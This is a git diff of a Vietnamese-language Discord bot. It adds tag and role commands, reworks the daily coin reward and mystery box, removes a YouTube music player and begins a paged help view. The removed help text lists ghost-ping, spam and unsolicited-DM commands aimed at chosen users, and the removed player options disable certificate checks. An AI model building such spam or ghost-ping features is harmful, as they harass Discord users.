+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, f"/add-tag role:{role.id} name:{name} icon:{icon}", guild_name, "Slash Command")
+    await send_dm_notification(user, f"/add-tag role:{role.id} name:{name} icon:{icon}", guild_name, "Slash Command")
+    
+def extract_name_and_emoji_from_tag(tag_name: str):
+    """
+    Tách emoji từ tag name - CHỈ TRẢ VỀ EMOJI
+    """
+    # Load tag data
+    tag_data = load_json(TAG_FILE)
+    
+    if tag_name not in tag_data:
+        return None
+    
+    tag_info = tag_data[tag_name]
+    
+    # FORMAT CŨ: tag_info là số (role_id)
+    if isinstance(tag_info, int):
+        return None
+    
+    # FORMAT MỚI: tag_info là dictionary
+    # Kiểm tra xem có icon không
+    if "icon" not in tag_info or not tag_info["icon"]:
+        return None
+    
+    icon_data = tag_info["icon"]
+    
+    # Custom emoji
+    if icon_data["type"] == "custom":
+        try:
+            return discord.PartialEmoji(name=icon_data["name"], id=icon_data["id"])
+        except:
+            return None
+    # Unicode emoji
+    elif icon_data["type"] == "unicode":
+        return icon_data["emoji"]
+    
+    return None
+    
+@bot.tree.command(name="remove-tag", description="Xóa tag khỏi hệ thống")
+@app_commands.describe(
+    role="Role cần xóa khỏi tag system"
+)
+async def remove_tag(interaction: discord.Interaction, role: discord.Role):
+    """Xóa tag khỏi file tag.json"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Load tag data hiện tại
+    tag_data = load_json(TAG_FILE)
+    
+    # Tìm tag có role_id trùng
+    tag_to_remove = None
+    for tag_name, role_id in tag_data.items():
+        if role_id == role.id:
+            tag_to_remove = tag_name
+            break
+    
+    if not tag_to_remove:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description=f"Role {role.mention} không có trong hệ thống tag!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+    
+    # Xóa tag
+    del tag_data[tag_to_remove]
+    save_json(TAG_FILE, tag_data)
+    
+    embed = discord.Embed(
+        title="✅ Đã xóa tag",
+        description=f"Đã xóa tag **{tag_to_remove}** với role {role.mention}",
+        color=discord.Color.green()
+    )
+    await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    # Log
+    user = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user, f"/remove-tag role:{role.id}", guild_name, "Slash Command")
+    await send_dm_notification(user, f"/remove-tag role:{role.id}", guild_name, "Slash Command")
+    
+@bot.tree.command(name="give-tag", description="Give tag cho user")
+@app_commands.describe(
+    user="User để give tag"
+)
+async def give_tag(interaction: discord.Interaction, user: discord.Member):
+    """Give tag cho user thông qua dropdown"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Load tag data
+    tag_data = load_json(TAG_FILE)
+    if not tag_data:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Không có tag nào trong hệ thống!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="🎯 Give Tag",
+        description=f"Chọn tag để give cho {user.mention}",
+        color=discord.Color.blue()
+    )
+    
+    await interaction.response.send_message(
+        embed=embed, 
+        view=GiveTagView(user, tag_data), 
+        ephemeral=True
+    )
+    
+    # Log
+    user_log = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user_log, f"/give-tag user:{user.id}", guild_name, "Slash Command")
+    await send_dm_notification(user_log, f"/give-tag user:{user.id}", guild_name, "Slash Command")
+    
+@bot.tree.command(name="remove-user-tag", description="Remove tag khỏi user")
+@app_commands.describe(
+    user="User để remove tag"
+)
+async def remove_user_tag(interaction: discord.Interaction, user: discord.Member):
+    """Remove tag khỏi user thông qua dropdown"""
+    if not is_user_allowed(interaction.user.id):
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Bạn không có quyền sử dụng lệnh này!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Load tag data
+    tag_data = load_json(TAG_FILE)
+    if not tag_data:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description="Không có tag nào trong hệ thống!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    # Kiểm tra xem user có tag nào không
+    has_any_tag = False
+    for role_id in tag_data.values():
+        role = discord.utils.get(user.guild.roles, id=role_id)
+        if role and role in user.roles:
+            has_any_tag = True
+            break
+    
+    if not has_any_tag:
+        embed = discord.Embed(
+            title="❌ Lỗi",
+            description=f"{user.mention} không có tag nào để remove!",
+            color=discord.Color.red()
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+        return
+
+    embed = discord.Embed(
+        title="🎯 Remove User Tag",
+        description=f"Chọn tag để remove khỏi {user.mention}",
+        color=discord.Color.blue()
+    )
+    
+    await interaction.response.send_message(
+        embed=embed, 
+        view=RemoveUserTagView(user, tag_data), 
+        ephemeral=True
+    )
+    
+    # Log
+    user_log = f"{interaction.user.name}#{interaction.user.discriminator}"
+    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+    log_command(user_log, f"/remove-user-tag user:{user.id}", guild_name, "Slash Command")
+    await send_dm_notification(user_log, f"/remove-user-tag user:{user.id}", guild_name, "Slash Command")
+    
 @bot.tree.command(name="taixiu", description="Chơi Tài Xỉu")
 @app_commands.describe(select="Chọn Tài hoặc Xỉu", amount="Số coin bạn muốn cược")
 @app_commands.choices(select=[
@@ -945,7 +3365,7 @@ async def addcoin(interaction: discord.Interaction, user_id: str, amount: int):
         await interaction.response.send_message(embed=embed, ephemeral=True)
         return
         
-    new_bal = add_balance(user_id, amount)
+    new_bal = add_balance(user_id, amount)  # HÀM ĐÃ ĐƯỢC SỬA
     await interaction.response.send_message(embed=simple_embed("✅ Đã Thêm Coin", f"Cộng {amount}<:lonelycoin:1421380256148750429> cho {user_id}\n💰 Số dư: {new_bal}<:lonelycoin:1421380256148750429>", discord.Color.green()))
     
     # LOG command
@@ -965,7 +3385,7 @@ async def removecoin(interaction: discord.Interaction, user_id: str, amount: int
         await interaction.response.send_message(embed=embed, ephemeral=True)
         return
         
-    new_bal = remove_balance(user_id, amount)
+    new_bal = remove_balance(user_id, amount)  # HÀM ĐÃ ĐƯỢC SỬA
     await interaction.response.send_message(embed=simple_embed("⚠️ Đã Trừ Coin", f"Trừ {amount}<:lonelycoin:1421380256148750429> của {user_id}\n💰 Số dư: {new_bal}<:lonelycoin:1421380256148750429>", discord.Color.orange()))
 
     # LOG command
@@ -985,7 +3405,7 @@ async def setcoin(interaction: discord.Interaction, user_id: str, amount: int):
         await interaction.response.send_message(embed=embed, ephemeral=True)
         return
     
-    set_balance(user_id, amount)
+    set_balance(user_id, amount)  # HÀM ĐÃ ĐƯỢC SỬA
     await interaction.response.send_message(embed=simple_embed("🔧 Đặt Coin", f"Số dư của {user_id} = {amount}<:lonelycoin:1421380256148750429>", discord.Color.blue()))
     
     # LOG command
@@ -1165,7 +3585,7 @@ async def on_message(message):
     if message.author.bot or not message.guild: 
         return await bot.process_commands(message)
     
-    user_id = str(message.author.id)
+    user_id = str(message.author.id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
     current_data = levels.get(user_id, {"xp": 0, "level": 1})
     xp = current_data["xp"] + random.randint(5, 15)
     level = current_data["level"]
@@ -1181,9 +3601,9 @@ async def on_message(message):
         await message.channel.send(embed=embed)
     
     levels[user_id] = {"xp": xp, "level": level}
-    save_json(levels, LEVEL_FILE)
+    save_json(LEVEL_FILE, levels)  # ĐÃ SỬA THỨ TỰ THAM SỐ
     await bot.process_commands(message)
-
+    
 # ====== ECONOMY COMMANDS ======
 @bot.command()
 async def balance(ctx):
@@ -1217,75 +3637,77 @@ async def balance_slash(interaction: discord.Interaction):
     log_command(user, "/balance", guild_name, "Slash Command")
     await send_dm_notification(user, "/balance", guild_name, "Slash Command")
 
-@bot.command()
-async def daily(ctx):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if not can_daily(ctx.author.id):
-        user_id = str(ctx.author.id)
-        last_claim = datetime.datetime.fromisoformat(daily_data[user_id]["last_claimed"])
-        next_claim = last_claim + datetime.timedelta(days=1)
-        wait_time = next_claim - datetime.datetime.now()
-        hours = int(wait_time.total_seconds() // 3600)
-        minutes = int((wait_time.total_seconds() % 3600) // 60)
-        
-        embed = discord.Embed(
-            title="❌ Đã nhận daily hôm nay",
-            description=f"Bạn có thể nhận lại sau {hours} giờ {minutes} phút\n⏰ Lần cuối: {daily_data[user_id]['time']} {daily_data[user_id]['date']}",
-            color=discord.Color.orange()
-        )
-        await ctx.send(embed=embed)
-        return
-    
-    add_balance(ctx.author.id, 100)
-    update_daily(ctx.author.id)
-    
-    embed = discord.Embed(
-        title="🎁 Daily Reward",
-        description=f"{ctx.author.mention} đã nhận **100<:lonelycoin:1421380256148750429>**\n⏰ Thời gian: {datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y')}",
-        color=discord.Color.gold()
-    )
-    await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, "!daily", guild_name, "Text Command")
-    await send_dm_notification(user, "!daily", guild_name, "Text Command")
+@bot.tree.command(name="daily", description="Nhận phần thưởng đăng nhập hằng ngày")
+async def daily(interaction: discord.Interaction):
+    user_id = str(interaction.user.id)  # ĐẢM BẢO CHUYỂN THÀNH STRING
+    now = datetime.datetime.now()
 
-@bot.tree.command(name="daily", description="Nhận 100 coins mỗi ngày")
-async def daily_slash(interaction: discord.Interaction):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    if not can_daily(interaction.user.id):
-        user_id = str(interaction.user.id)
-        last_claim = datetime.datetime.fromisoformat(daily_data[user_id]["last_claimed"])
-        next_claim = last_claim + datetime.timedelta(days=1)
-        wait_time = next_claim - datetime.datetime.now()
-        hours = int(wait_time.total_seconds() // 3600)
-        minutes = int((wait_time.total_seconds() % 3600) // 60)
-        
-        embed = discord.Embed(
-            title="❌ Đã nhận daily hôm nay",
-            description=f"Bạn có thể nhận lại sau {hours} giờ {minutes} phút\n⏰ Lần cuối: {daily_data[user_id]['time']} {daily_data[user_id]['date']}",
-            color=discord.Color.orange()
-        )
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    add_balance(interaction.user.id, 100)
-    update_daily(interaction.user.id)
-    
+    user_info = daily_data.get(user_id, {
+        "last_claimed": None,
+        "date": None,
+        "time": None,
+        "last_box": None
+    })
+
+    # check đã nhận xu hôm nay chưa
+    if user_info["last_claimed"]:
+        last_claimed = datetime.datetime.fromisoformat(user_info["last_claimed"])
+        if last_claimed.date() == now.date():
+            return await interaction.response.send_message(
+                embed=discord.Embed(
+                    title="❌ Hôm nay bạn đã nhận daily rồi!",
+                    color=discord.Color.red()
+                ),
+                ephemeral=True
+            )
+
+    # === Thưởng xu ===
+    reward = 100  # số xu daily
+    credits[user_id] = credits.get(user_id, 0) + reward
+
+    # update daily info
+    user_info["last_claimed"] = now.isoformat()
+    user_info["date"] = now.strftime("%d/%m/%Y")
+    user_info["time"] = now.strftime("%H:%M:%S")
+
+    # === Embed kết quả ===
     embed = discord.Embed(
         title="🎁 Daily Reward",
-        description=f"{interaction.user.mention} nhận **100<:lonelycoin:1421380256148750429>**\n⏰ Thời gian: {datetime.datetime.now().strftime('%H:%M:%S %d/%m/%Y')}",
-        color=discord.Color.gold()
+        color=discord.Color.green()
     )
+    embed.add_field(name="💰 Xu nhận được", value=f"+{reward} <:lonelycoin:1421380256148750429>\n(Tổng: {credits[user_id]} <:lonelycoin:1421380256148750429>)", inline=False)
+
+    # === Thưởng Mystery Box (cách 7 ngày) ===
+    got_box = False
+    if user_info["last_box"]:
+        last_box_date = datetime.datetime.fromisoformat(user_info["last_box"]).date()
+    else:
+        last_box_date = now.date() - datetime.timedelta(days=7)
+
+    if (now.date() - last_box_date).days >= 7:
+        box[user_id] = box.get(user_id, 0) + 1
+        user_info["last_box"] = now.isoformat()
+        got_box = True
+        embed.add_field(
+            name="📦 Mystery Box",
+            value=f"+1 <:enderchest:1422102654766678116>\n(Tổng: {box[user_id]} <:enderchest:1422102654766678116>)",
+            inline=False
+        )
+        
+
+    if not got_box:
+        embed.add_field(
+            name="📦 Mystery Box",
+            value=f"Bạn hiện có **{box.get(user_id, 0)}** <:enderchest:1422102654766678116>",
+            inline=False
+        )
+
+    # lưu lại
+    daily_data[user_id] = user_info
+    save_json(DAILY_FILE, daily_data)
+    save_json(DATA_FILE, credits)
+    save_json(BOX_FILE, box)
+
     await interaction.response.send_message(embed=embed, ephemeral=True)
     
     user = f"{interaction.user.name}#{interaction.user.discriminator}"
@@ -2072,308 +4494,6 @@ async def premium_slash(interaction: discord.Interaction):
     log_command(user, "/premium", guild_name, "Slash Command")
     await send_dm_notification(user, "/premium", guild_name, "Slash Command")
 
-# ====== MUSIC SYSTEM ======
-ytdl_opts = {
-    'format': 'bestaudio/best',
-    'extractaudio': True,
-    'audioformat': 'mp3',
-    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
-    'restrictfilenames': True,
-    'noplaylist': True,
-    'nocheckcertificate': True,
-    'ignoreerrors': False,
-    'logtostderr': False,
-    'quiet': True,
-    'no_warnings': True,
-    'default_search': 'auto',
-    'source_address': '0.0.0.0',
-}
-
-ffmpeg_opts = {
-    'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
-    'options': '-vn'
-}
-
-ytdl = youtube_dl.YoutubeDL(ytdl_opts)
-
-class YTDLSource(discord.PCMVolumeTransformer):
-    def __init__(self, source, *, data, volume=0.5):
-        super().__init__(source, volume)
-        self.data = data
-        self.title = data.get('title')
-        self.url = data.get('url')
-
-    @classmethod
-    async def from_url(cls, url, *, loop=None, stream=False):
-        loop = loop or asyncio.get_event_loop()
-        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
-        
-        if 'entries' in data:
-            data = data['entries'][0]
-            
-        filename = data['url'] if stream else ytdl.prepare_filename(data)
-        return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_opts), data=data)
-
-@bot.command()
-async def join(ctx):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if ctx.author.voice:
-        await ctx.author.voice.channel.connect()
-        embed = discord.Embed(title="✅ Đã kết nối", description=f"Đã kết nối đến {ctx.author.voice.channel.name}", color=discord.Color.green())
-        await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Bạn chưa vào voice channel.", color=discord.Color.red())
-        await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, "!join", guild_name, "Text Command")
-    await send_dm_notification(user, "!join", guild_name, "Text Command")
-
-@bot.tree.command(name="join", description="Bot tham gia voice channel của bạn")
-async def join_slash(interaction: discord.Interaction):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    if interaction.user.voice:
-        await interaction.user.voice.channel.connect()
-        embed = discord.Embed(title="✅ Đã kết nối", description=f"Đã kết nối đến {interaction.user.voice.channel.name}", color=discord.Color.green())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Bạn chưa vào voice channel.", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
-    log_command(user, "/join", guild_name, "Slash Command")
-    await send_dm_notification(user, "/join", guild_name, "Slash Command")
-
-@bot.command()
-async def leave(ctx):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if ctx.voice_client:
-        await ctx.voice_client.disconnect()
-        embed = discord.Embed(title="✅ Đã rời khỏi", description="Đã rời khỏi voice channel.", color=discord.Color.green())
-        await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Bot không ở trong voice channel.", color=discord.Color.red())
-        await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, "!leave", guild_name, "Text Command")
-    await send_dm_notification(user, "!leave", guild_name, "Text Command")
-
-@bot.tree.command(name="leave", description="Bot rời khỏi voice channel")
-async def leave_slash(interaction: discord.Interaction):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    if interaction.guild.voice_client:
-        await interaction.guild.voice_client.disconnect()
-        embed = discord.Embed(title="✅ Đã rời khỏi", description="Đã rời khỏi voice channel.", color=discord.Color.green())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Bot không ở trong voice channel.", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
-    log_command(user, "/leave", guild_name, "Slash Command")
-    await send_dm_notification(user, "/leave", guild_name, "Slash Command")
-
-@bot.command()
-async def play(ctx, *, query: str):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if not ctx.voice_client:
-        if ctx.author.voice:
-            await ctx.author.voice.channel.connect()
-        else:
-            embed = discord.Embed(title="❌ Lỗi", description="Bạn chưa vào voice channel.", color=discord.Color.red())
-            return await ctx.send(embed=embed)
-    
-    async with ctx.typing():
-        try:
-            player = await YTDLSource.from_url(query, loop=bot.loop, stream=True)
-            ctx.voice_client.stop()
-            ctx.voice_client.play(player, after=lambda e: print(f'Player error: {e}') if e else None)
-            embed = discord.Embed(title="🎵 Đang phát", description=f"**{player.title}**", color=discord.Color.green())
-            await ctx.send(embed=embed)
-        except Exception as e:
-            embed = discord.Embed(title="❌ Lỗi", description=f"Lỗi khi phát nhạc: {e}", color=discord.Color.red())
-            await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, f"!play {query}", guild_name, "Text Command")
-    await send_dm_notification(user, f"!play {query}", guild_name, "Text Command")
-
-@bot.tree.command(name="play", description="Phát nhạc từ YouTube")
-async def play_slash(interaction: discord.Interaction, query: str):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    if not interaction.guild.voice_client:
-        if interaction.user.voice:
-            await interaction.user.voice.channel.connect()
-        else:
-            embed = discord.Embed(title="❌ Lỗi", description="Bạn chưa vào voice channel.", color=discord.Color.red())
-            return await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    await interaction.response.defer()
-    try:
-        player = await YTDLSource.from_url(query, loop=bot.loop, stream=True)
-        interaction.guild.voice_client.stop()
-        interaction.guild.voice_client.play(player, after=lambda e: print(f'Player error: {e}') if e else None)
-        embed = discord.Embed(title="🎵 Đang phát", description=f"**{player.title}**", color=discord.Color.green())
-        await interaction.followup.send(embed=embed)
-    except Exception as e:
-        embed = discord.Embed(title="❌ Lỗi", description=f"Lỗi khi phát nhạc: {e}", color=discord.Color.red())
-        await interaction.followup.send(embed=embed)
-    
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
-    log_command(user, f"/play {query}", guild_name, "Slash Command")
-    await send_dm_notification(user, f"/play {query}", guild_name, "Slash Command")
-
-@bot.command()
-async def stop(ctx):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if ctx.voice_client:
-        ctx.voice_client.stop()
-        embed = discord.Embed(title="⏹️ Đã dừng", description="Đã dừng phát nhạc.", color=discord.Color.green())
-        await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Bot không đang phát nhạc.", color=discord.Color.red())
-        await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, "!stop", guild_name, "Text Command")
-    await send_dm_notification(user, "!stop", guild_name, "Text Command")
-
-@bot.tree.command(name="stop", description="Dừng phát nhạc")
-async def stop_slash(interaction: discord.Interaction):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    if interaction.guild.voice_client:
-        interaction.guild.voice_client.stop()
-        embed = discord.Embed(title="⏹️ Đã dừng", description="Đã dừng phát nhạc.", color=discord.Color.green())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Bot không đang phát nhạc.", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
-    log_command(user, "/stop", guild_name, "Slash Command")
-    await send_dm_notification(user, "/stop", guild_name, "Slash Command")
-
-@bot.command()
-async def pause(ctx):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if ctx.voice_client and ctx.voice_client.is_playing():
-        ctx.voice_client.pause()
-        embed = discord.Embed(title="⏸️ Đã tạm dừng", description="Đã tạm dừng phát nhạc.", color=discord.Color.green())
-        await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Không có nhạc đang phát.", color=discord.Color.red())
-        await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, "!pause", guild_name, "Text Command")
-    await send_dm_notification(user, "!pause", guild_name, "Text Command")
-
-@bot.tree.command(name="pause", description="Tạm dừng nhạc")
-async def pause_slash(interaction: discord.Interaction):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    if interaction.guild.voice_client and interaction.guild.voice_client.is_playing():
-        interaction.guild.voice_client.pause()
-        embed = discord.Embed(title="⏸️ Đã tạm dừng", description="Đã tạm dừng phát nhạc.", color=discord.Color.green())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Không có nhạc đang phát.", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
-    log_command(user, "/pause", guild_name, "Slash Command")
-    await send_dm_notification(user, "/pause", guild_name, "Slash Command")
-
-@bot.command()
-async def resume(ctx):
-    if is_user_banned(ctx.author.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await ctx.send(embed=embed)
-        return
-    
-    if ctx.voice_client and ctx.voice_client.is_paused():
-        ctx.voice_client.resume()
-        embed = discord.Embed(title="▶️ Đã tiếp tục", description="Đã tiếp tục phát nhạc.", color=discord.Color.green())
-        await ctx.send(embed=embed)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Nhạc không đang tạm dừng.", color=discord.Color.red())
-        await ctx.send(embed=embed)
-    
-    user = f"{ctx.author.name}#{ctx.author.discriminator}"
-    guild_name = ctx.guild.name if ctx.guild else "Direct Message"
-    log_command(user, "!resume", guild_name, "Text Command")
-    await send_dm_notification(user, "!resume", guild_name, "Text Command")
-
-@bot.tree.command(name="resume", description="Tiếp tục phát nhạc")
-async def resume_slash(interaction: discord.Interaction):
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(title="❌ Bị cấm", description="Bạn đã bị cấm sử dụng bot này!", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-        
-    if interaction.guild.voice_client and interaction.guild.voice_client.is_paused():
-        interaction.guild.voice_client.resume()
-        embed = discord.Embed(title="▶️ Đã tiếp tục", description="Đã tiếp tục phát nhạc.", color=discord.Color.green())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    else:
-        embed = discord.Embed(title="❌ Lỗi", description="Nhạc không đang tạm dừng.", color=discord.Color.red())
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-    
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
-    log_command(user, "/resume", guild_name, "Slash Command")
-    await send_dm_notification(user, "/resume", guild_name, "Slash Command")
-
 # Slash Command - Removewhitelist: Xóa người dùng khỏi whitelist
 @bot.tree.command(name="removewhitelist", description="Xóa người dùng khỏi danh sách được phép sử dụng bot")
 @app_commands.describe(
@@ -2500,112 +4620,34 @@ async def premium_command(interaction: discord.Interaction):
     log_command(user, "/premium_command", guild_name, "Slash Command")
     await send_dm_notification(user, "/premium_command", guild_name, "Slash Command")
 # Slash Command - Help
-@bot.tree.command(name="help", description="Hiển thị tất cả lệnh có sẵn trong bot")
-async def help_command(interaction: discord.Interaction):
-    """Slash command hiển thị trợ giúp"""
-    # Kiểm tra xem user có bị cấm không
-    if is_user_banned(interaction.user.id):
-        embed = discord.Embed(
-            title="❌ Bị cấm",
-            description="Bạn đã bị cấm sử dụng bot này!",
-            color=discord.Color.red()
-        )
-        await interaction.response.send_message(embed=embed, ephemeral=True)
-        return
-    
-    current_time = get_utc7_time()
-    user = f"{interaction.user.name}#{interaction.user.discriminator}"
-    guild_name = interaction.guild.name if interaction.guild else "Direct Message"
+class HelpView(discord.ui.View):
+    def __init__(self, pages, author_id):
+        super().__init__(timeout=120)
+        self.pages = pages
+        self.current = 0
+        self.author_id = author_id
 
-    embed = discord.Embed(
-        title="🤖 Lonely Hub - Hệ Thống Lệnh",
-        description="Xin chào! Đây là danh sách đầy đủ các lệnh có trong bot.\n\n**📊 Thông tin bot:**\n• Prefix: `!`, `?`, `.`, `/`\n• Múi giờ: `UTC+7`\n• Phiên bản: `1.0.0`",
-        color=0x00ffaa,
-        timestamp=current_time
-    )
-    
-    # Thêm các lệnh cơ bản
-    embed.add_field(
-        name="🔧 LỆNH CƠ BẢN",
-        value=(
-            "• `/ping` - Kiểm tra độ trễ của bot\n"
-            "• `/info` - Xem thông tin về bot\n"
-            "• `/whitelist` - Xem danh sách user được phép\n"
-            "• `/help` - Hiển thị trợ giúp này\n"
-            "• `/say` - Làm bot nói gì đó"
-            "• `/sayv2` - Làm bot nói gì đó (No Need Invite)"
-            "• `/ghostping <user_id> [delay] [quantity]` - Ghost ping người dùng\n"
-            "• `/ghostpingv2 <user_id> [delay] [quantity]` - Ghost ping người dùng (No Need Invite)\n"
-            "• `/dms <user_id> <message>` - Gửi tin nhắn DM đến người dùng\n"
-            "• `/spam <message> <quantity> [user_id]` - Spam tin nhắn\n"
-            "• `/spamv2 <message> <quantity> [user_id]` - Spam tin nhắn (No Need Invite)\n"            
-            "• `/invite` - Invite Bot To The Server"
-        ),
-        inline=False
-    )
-    
-    # Các lệnh admin
-    admin_commands = (
-        "• `/premium_command` - Xem các lệnh premium (admin only)"
-        "• `/bancmd <user_id> <reason>` - Cấm user dùng lệnh"
-        "• `/unbancmd <user_id> <reason>` - Gỡ cấm user dùng lệnh"
-        "• `/bancmdlist` - Xem các users bị cấm dùng lệnh"
-        "• `/addwhitelist <user_id> <name>` - Add Whitelist Cho Users"
-        "• `/removewhitelist <user_id> <name>` - Xoá whitelist của users"
-    ) 
-    
-    if is_user_allowed(interaction.user.id):
-        embed.add_field(
